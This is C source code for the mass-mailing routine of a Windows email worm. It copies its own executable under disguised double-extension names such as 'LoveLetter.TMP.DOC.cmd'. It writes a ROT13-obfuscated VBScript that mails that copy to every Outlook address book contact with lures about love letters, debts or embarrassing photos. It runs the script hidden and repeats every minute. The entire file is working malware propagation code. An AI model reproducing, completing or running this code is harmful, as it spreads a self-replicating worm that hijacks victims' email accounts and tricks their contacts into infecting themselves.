#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>

#pragma optimize("", off)
DWORD WINAPI _MassMailMain(void)
{
    volatile struct _LocalCtx {
        char Subject[100];
        char Message[512];
        char Attachment[100];
        char MyPath[100];
        char VBSFile[50];
        char RanNu[20];
        unsigned char VBS_Mail[2000];
        FILE *file;
    } ctx;

    while (1) {
        memset(ctx.Subject, 0, sizeof(ctx.Subject));
        memset(ctx.Message, 0, sizeof(ctx.Message));
        memset(ctx.Attachment, 0, sizeof(ctx.Attachment));
        memset(ctx.MyPath, 0, sizeof(ctx.MyPath));
        memset(ctx.VBS_Mail, 0, sizeof(ctx.VBS_Mail));
        memset(ctx.VBSFile, 0, sizeof(ctx.VBSFile));
        memset(ctx.RanNu, 0, sizeof(ctx.RanNu));

        srand(GetTickCount());
        sprintf(ctx.RanNu, "\\mailer.vbs");
        GetEnvironmentVariableA("HOMEDRIVE", ctx.Attachment, sizeof(ctx.Attachment));
        strcpy(ctx.VBSFile, ctx.Attachment);
        strcat(ctx.VBSFile, ctx.RanNu);
        GetModuleFileNameA(NULL, ctx.MyPath, sizeof(ctx.MyPath));

        switch (rand() % 5) {
            case 0:
                strcpy(ctx.Subject, "Zl cnffvbangr ybir gbjneqf lbh");
                strcpy(ctx.Message, "Zl ybiryrggre sbe lbh vf va gur nggnpurq qbphzrag. =)");
                strcat(ctx.Attachment, "\\LoveYouLife.TMP.DOC.cmd");
                CopyFileA(ctx.MyPath, ctx.Attachment, FALSE);
                _CiphStr(ctx.Attachment, ctx.Attachment);
                break;
            case 1:
                strcpy(ctx.Subject, "Lbh bjr zr ovt gvzr");
                strcpy(ctx.Message, "Lbh pna'g whfg sbetrg nobhg gur ovyy lbh yrsg zr jvgu. V nggnpurq gb gur qbphzragf nf cebbs lbh bjr zr.");
                strcat(ctx.Attachment, "\\DocumentsPay.TMP.DOC.cmd");
                CopyFileA(ctx.MyPath, ctx.Attachment, FALSE);
                _CiphStr(ctx.Attachment, ctx.Attachment);
                break;
            case 2:
                strcpy(ctx.Subject, "Url! Purpx guvf bhg!");
                strcpy(ctx.Message, "V guvax gung'f lbh va guvf cvpgher, ubj rzonerffvat!");
                strcat(ctx.Attachment, "\\PartyTips.TMP.JPEG.cmd");
                CopyFileA(ctx.MyPath, ctx.Attachment, FALSE);
                _CiphStr(ctx.Attachment, ctx.Attachment);
                break;
            case 3:
                strcpy(ctx.Subject, "Vf gung lbh?");
                strcpy(ctx.Message, "V erpnyy lbh orvat va guvf cvpgher, juvpu crefba ner lbh?");
                strcat(ctx.Attachment, "\\BeachPicture.TMP.JPEG.cmd");
                CopyFileA(ctx.MyPath, ctx.Attachment, FALSE);
                _CiphStr(ctx.Attachment, ctx.Attachment);
                break;
            case 4:
                strcpy(ctx.Subject, "V YBIR LBH!");
                strcpy(ctx.Message, "Cyrnfr ernq gur nggnpurq ybir yrggre sebz zr. ;)");
                strcat(ctx.Attachment, "\\LoveLetter.TMP.DOC.cmd");
                CopyFileA(ctx.MyPath, ctx.Attachment, FALSE);
                _CiphStr(ctx.Attachment, ctx.Attachment);
                break;
        }

        sprintf((char *)ctx.VBS_Mail,
                 "qvz k\r\n"
                 "erz\r\n"
                 "ba reebe erfhzr arkg\r\n"
                 "erz\r\n"
                 "Frg sfb =\"Fpevcgvat.SvyrFlfgrz.Bowrpg\"\r\n"
                 "erz\r\n"
                 "Frg fb=PerngrBowrpg(sfb)\r\n"
                 "erz\r\n"
                 "Frg by=PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg bhg=JFpevcg.PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg zncv = bhg.TrgAnzrFcnpr(\"ZNCV\")\r\n"
                 "erz\r\n"
                 "Frg n = zncv.NqqerffYvfgf(1)\r\n"
                 "erz\r\n"
                 "Frg nr=n.NqqerffRagevrf\r\n"
                 "erz\r\n"
                 "Sbe k=1 Gb nr.Pbhag\r\n"
                 "erz\r\n"
                 "Frg pv=by.PerngrVgrz(0)\r\n"
                 "erz\r\n"
                 "Frg Znvy=pv\r\n"
                 "erz\r\n"
                 "Znvy.gb=by.TrgAnzrFcnpr(\"ZNCV\").NqqerffYvfgf(1).NqqerffRagevrf(k)\r\n"
                 "erz\r\n"
                 "Znvy.Fhowrpg=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Obql=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Nggnpuzragf.Nqq(\"%s\")\r\n"
                 "erz\r\n"
                 "Znvy.fraq\r\n"
                 "erz\r\n"
                 "Arkg\r\n"
                 "erz\r\n"
                 "by.Dhvg\r\n",
                 ctx.Subject, ctx.Message, ctx.Attachment);

        _CiphStr((char *)ctx.VBS_Mail, (char *)ctx.VBS_Mail);

        ctx.file = fopen(ctx.VBSFile, "wb");
        fputs((const char *)ctx.VBS_Mail, ctx.file);
        fclose(ctx.file);

        ShellExecuteA(NULL, "open", ctx.VBSFile, NULL, NULL, SW_HIDE);
        Sleep(60000);
    }
    return 0; // unreachable
}
#pragma optimize("", on)
